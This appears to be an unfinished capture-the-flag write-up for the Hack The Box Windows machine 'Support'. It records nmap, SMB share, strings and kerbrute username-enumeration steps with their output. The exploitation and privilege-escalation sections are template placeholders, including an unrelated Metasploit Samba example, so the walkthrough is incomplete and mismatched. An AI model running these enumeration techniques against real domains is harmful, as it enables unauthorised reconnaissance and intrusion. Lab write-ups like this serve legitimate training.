### Hack The Box Writeup: Support

## Overview

- **Machine Name**: Support
- **Difficulty**:Easy
- **Platform**: Hack The Box
- **Operating System**: Windows
- **Key Objectives**: 
- **Date Solved**: JUne 2025

## Tools Used

- **Enumeration**: \[e.g., Nmap, Gobuster\]
- **Exploitation**: \[e.g., Metasploit, Custom Python scripts\]
- **Privilege Escalation**: \[e.g., LinPEAS, Windows Exploit Suggester\]
- **Other**: \[e.g., Burp Suite, Wireshark\]

## Methodology

### Initial Enumeration

```bash
# ping machine
ping -c 1 10.10.11.174

# nmap
nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.10.11.174 -oG allPorts
nmap -sCV -p53,139,135,445,464,49741,49664,636,49686,49667,3268,3269,593,49699,9389,389,88,49674,5985 10.10.11.174 -oN targeted

# 445 port is to SMB client
smbclient -L 10.10.11.174 -N

# ans
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	support-tools   Disk      support staff tools
	SYSVOL          Disk      Logon server share 

# WE need to view file privileges
smbmap -H 10.10.11.174 -u none

# ans
[+] Guest session   	IP: 10.10.11.174:445	Name: 10.10.11.174                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	support-tools                                     	READ ONLY	support staff tools
	SYSVOL 


```
- Using crackmapexec
```bash

$ crackmapexec smb 10.10.11.174
SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)

$ crackmapexec smb 10.129.230.181 --share # shared resources into network

$ crackmapexec smb 10.129.230.181 --shares
SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.129.230.181  445    DC               [-] Error enumerating shares: STATUS_USER_SESSION_DELETED


```
- We need to add in /etc/host domains
```bash
10.129.230.181 dc dc.support.htb support.htb

```

- Connecting to the machine to view files in a read-only directory
```bash
smbclient //10.129.230.181/support-tools -N

$ smbclient //10.129.230.181/support-tools -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 20 12:01:06 2022
  ..                                  D        0  Sat May 28 06:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 06:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 06:19:55 2022
  putty.exe                           A  1273576  Sat May 28 06:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 06:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 12:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 06:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 06:19:43 2022

		4026367 blocks of size 4096. 971045 blocks available

# Extracting in the attackers machine the file 'UserInfo.exe.zip'
get UserInfo.exe.zip

# View file without extract
7z l UserInfo.exe.zip

# Extracting the file
7z x UserInfo.exe.zip

# View text in file
strings UserInfo.exe
strings -e l UserInfo.exe

# ans
@%1;
	5W5
0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E
armando
LDAP://support.htb
support\ldap
[-] At least one of -first or -last is required.
(givenName=
(sn=
(&(givenName=
)(sn=
[*] LDAP query to use: 
sAMAccountName
[-] No users identified with that query.
[+] Found 
 result
       
[-] Exception: 
[*] Getting data for 
sAMAccountName=
pwdLastSet
lastLogon
givenName
mail
[-] Unable to locate 
. Please try the find command to get the user's username.
First Name:           
Last Name:            
Contact:              
Last Password Change: 
find
Find a user
user
Get information about a user
UserInfo.exe
VS_VERSION_INFO
VarFileInfo
Translation
StringFileInfo
000004b0
Comments
CompanyName
FileDescription
UserInfo
FileVersion
1.0.0.0
InternalName
UserInfo.exe
LegalCopyright
Copyright 
  2022
LegalTrademarks
OriginalFilename
UserInfo.exe
ProductName
UserInfo
ProductVersion
1.0.0.0
Assembly Version
1.0.0.0
       

```
- Kerberos exposed port: `88`

- Download kerbrute from github: `https://github.com/ropnop/kerbrute/releases/tag/v1.0.3` and send it to /opt dir

- Create a dict with names from UserInfo.exe

```bash
/opt/kerbrute/kerbrute userenum -d support.htb --dc 10.129.20.217 users.txt

# ans
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 03/29/26 - Ronnie Flathers @ropnop

2026/03/29 15:18:59 >  Using KDC(s):
2026/03/29 15:18:59 >  	10.129.20.217:88

2026/03/29 15:18:59 >  [+] VALID USERNAME:	 ldap@support.htb
2026/03/29 15:18:59 >  Done! Tested 2 usernames (1 valid) in 0.170 seconds

# USING SECLISTS TO FIND ANOTHER USERS

2026/03/29 15:25:25 >  [+] VALID USERNAME:	 support@support.htb
2026/03/29 15:25:29 >  [+] VALID USERNAME:	 guest@support.htb
2026/03/29 15:25:56 >  [+] VALID USERNAME:	 administrator@support.htb
2026/03/29 15:30:17 >  [+] VALID USERNAME:	 Guest@support.htb
2026/03/29 15:30:19 >  [+] VALID USERNAME:	 Administrator@support.htb
2026/03/29 15:41:04 >  [+] VALID USERNAME:	 Support@support.htb
2026/03/29 15:45:23 >  [+] VALID USERNAME:	 GUEST@support.htb

```
- We need to transfer files in a windows machine
```bash
python3 -m http.server 8080


```


\[Explain findings, e.g., open ports, services, versions.\]

### Exploitation

\[Detail the exploitation process, including vulnerabilities targeted and how you exploited them.\]

```bash
# Example: Exploiting Samba with Metasploit
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS [machine_ip]
run
```

\[Describe the outcome, e.g., initial shell access, user-level credentials.\]

### Privilege Escalation

\[Explain how you escalated privileges to root/admin. Include any misconfigurations or exploits used.\]

```bash
# Example: Checking for SUID binaries
find / -perm -4000 2>/dev/null
```

\[Describe the final access achieved, e.g., root shell, admin credentials.\]

## Challenges Faced

\[List specific challenges encountered, e.g., difficulty identifying the correct exploit, dealing with restricted shells.\]

- **Challenge 1**: \[e.g., Nmap scans were blocked by a firewall.\]
  - **Solution**: \[e.g., Used --script-args to bypass restrictions.\]
- **Challenge 2**: \[e.g., Password cracking took too long.\]
  - **Solution**: \[e.g., Optimized wordlist with custom rules in Hashcat.\]

## Lessons Learned

\[Summarize key takeaways from solving the machine.\]

- Learned to identify \[specific vulnerability, e.g., outdated Samba versions\] through thorough enumeration.
- Improved skills in \[technique, e.g., manual exploit development for CVE-XXXX-XXXX\].
- Gained experience with \[tool, e.g., LinPEAS for privilege escalation\].

## References

- \[Link to HTB machine page, e.g., https://app.hackthebox.com/machines/Lame\]
- \[CVE details, e.g., https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-XXXX-XXXX\]
- \[Tool documentation, e.g., https://nmap.org/book/man.html\]
- \[Relevant blog post or tutorial, e.g., https://example.com/samba-exploit-guide\]

---

*Written by YourName, \[Month Year\]. Feedback welcome at \[your contact, e.g., GitHub profile\].*